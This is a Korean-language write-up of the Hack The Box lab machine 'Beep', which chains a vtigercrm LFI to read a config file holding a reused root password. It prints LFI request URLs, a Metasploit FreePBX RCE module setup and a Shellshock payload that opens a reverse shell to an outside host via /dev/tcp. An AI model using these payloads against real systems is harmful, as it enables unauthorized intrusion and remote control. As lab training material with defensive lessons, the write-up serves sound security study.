# HTB - Beep

## 머신 정보

|항목|내용|
|---|---|
|이름|Beep|
|난이도|Easy|
|OS|Linux (CentOS)|
|IP|10.129.229.183|
|주요 취약점|LFI (CVE 없음) + 패스워드 재사용|
|추가 취약점|CVE-2012-4869 (FreePBX RCE), Shellshock (CVE-2014-6271)|
|태그|`Elastix` `LFI` `FreePBX` `Shellshock` `PasswordReuse` `Linux`|

---

## 공격 흐름 요약

```
nmap 포트 스캔
→ 443 포트 (Elastix)
→ LFI 취약점 (/vtigercrm/graph.php)
→ /etc/amportal.conf 읽기
→ 패스워드 획득 (jEhdIekWmdjE)
→ SSH root 로그인
→ User/Root Flag 획득
```

---

## 1. 정찰 (Reconnaissance)

### 1.1 Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.229.183
```

**결과:**

|PORT|SERVICE|
|---|---|
|22|SSH|
|25|SMTP|
|80|HTTP|
|110|POP3|
|111|rpcbind|
|143|IMAP|
|**443**|**HTTPS (Elastix)**|
|3306|MySQL|
|4445|upnotifyp|
|**10000**|**Webmin**|

### 1.2 TLS 버전 확인

```bash
nmap --script ssl-enum-ciphers -p 443 10.129.229.183
```

→ **TLSv1.0** 지원 확인 (최신 브라우저에서 접속 불가)

### 1.3 웹 서비스 확인

브라우저 SSL 에러 발생 시 curl 사용:

```bash
curl -k --tlsv1.0 https://10.129.229.183/
```

→ **Elastix** 로그인 페이지 확인

### 1.4 OS 확인

```bash
nmap -sV -p 22 10.129.229.183
```

→ SSH 배너에서 **CentOS** 확인

---

## 2. 취약점 분석

### LFI - vtigercrm graph.php

|항목|내용|
|---|---|
|취약 경로|`/vtigercrm/graph.php`|
|취약 파라미터|`current_language`|
|취약점 유형|Local File Inclusion (LFI)|
|인증 필요|❌ (Unauthenticated)|

`current_language` 파라미터에 디렉토리 트래버설 문자열 삽입으로 서버의 임의 파일 읽기 가능.

---

## 3. 초기 접근 (Initial Access)

### 3.1 LFI로 amportal.conf 읽기

```bash
curl -k --tlsv1.0 "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action"
```

**출력에서 패스워드 확인:**

```
AMPDBHOST=localhost
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
AMP_SECRET_HASH=jEhdIekWmdjE
```

### 3.2 SSH root 로그인

오래된 서버라 키 교환 알고리즘 옵션 필요:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    root@10.129.229.183
# 패스워드: jEhdIekWmdjE
```

→ **바로 root 로그인!**

---

## 4. Flag 획득

### User Flag (fanis 홈 디렉토리)

```bash
cat /home/fanis/user.txt
```

### Root Flag (root 홈 디렉토리)

```bash
cat /root/root.txt
```

---

## 5. 패스워드 재사용 현황

|서비스|포트|계정|패스워드|
|---|---|---|---|
|Elastix 관리자|443|admin|jEhdIekWmdjE|
|**SSH**|**22**|**root**|**jEhdIekWmdjE**|
|Webmin|10000|root|jEhdIekWmdjE|
|MySQL|3306|asteriskuser|jEhdIekWmdjE|

> 하나의 패스워드로 모든 서비스 접근 가능 → 패스워드 재사용의 위험성!

---

## 6. 추가 공략 방법

### 방법 1: CVE-2012-4869 (FreePBX Pre-auth RCE)

```bash
msfconsole
use exploit/unix/webapp/freepbx_callme_exec
set RHOSTS 10.129.229.183
set RPORT 443
set SSL true
set LHOST tun0
run
```

### 방법 2: Shellshock (CVE-2014-6271)

```bash
# nc 리스너
nc -lvnp 4444

# Shellshock 페이로드
curl -k --tlsv1.0 -A "() { :; }; bash -i >& /dev/tcp/10.10.17.240/4444 0>&1" \
https://10.129.229.183/cgi-bin/test.cgi
```

### 방법 3: Webmin 로그인 후 RCE

```
https://10.129.229.183:10000/
ID: root
PW: jEhdIekWmdjE
```

→ Webmin 명령 실행 기능으로 RCE

---

## 7. 기타 정보

### LFI로 읽을 수 있는 파일들

```bash
# 패스워드 파일
curl -k --tlsv1.0 "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action"

# 메일 폴더
curl -k --tlsv1.0 "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action"
```

### asterisk 메일 폴더 경로

```
/var/mail/asterisk
```

---

## 8. 정리 및 교훈

### 취약점 체인

```
Elastix LFI 취약점
→ /etc/amportal.conf 평문 패스워드 노출
→ 패스워드 재사용 (SSH root 포함)
→ 인증 없이 root 접근
```

### 핵심 교훈

- **LFI 취약점** → 설정 파일 노출 → 패스워드 탈취
- **패스워드 재사용** 절대 금지 (서비스마다 다른 패스워드 사용)
- **설정 파일에 평문 패스워드** 저장 금지
- **레거시 TLS** (TLSv1.0) 사용 금지
- **관리자 패널 외부 노출** 금지 (Webmin, Elastix)
- Beep는 **취약점이 너무 많아서** 다양한 방법으로 root 가능

---

## 참고

| 항목                         | 링크                                             |
| -------------------------- | ---------------------------------------------- |
| CVE-2012-4869              | https://nvd.nist.gov/vuln/detail/CVE-2012-4869 |
| CVE-2014-6271 (Shellshock) | https://nvd.nist.gov/vuln/detail/CVE-2014-6271 |
| Exploit-DB FreePBX         | https://www.exploit-db.com/exploits/18650      |
| Elastix LFI                | https://www.exploit-db.com/exploits/37637      |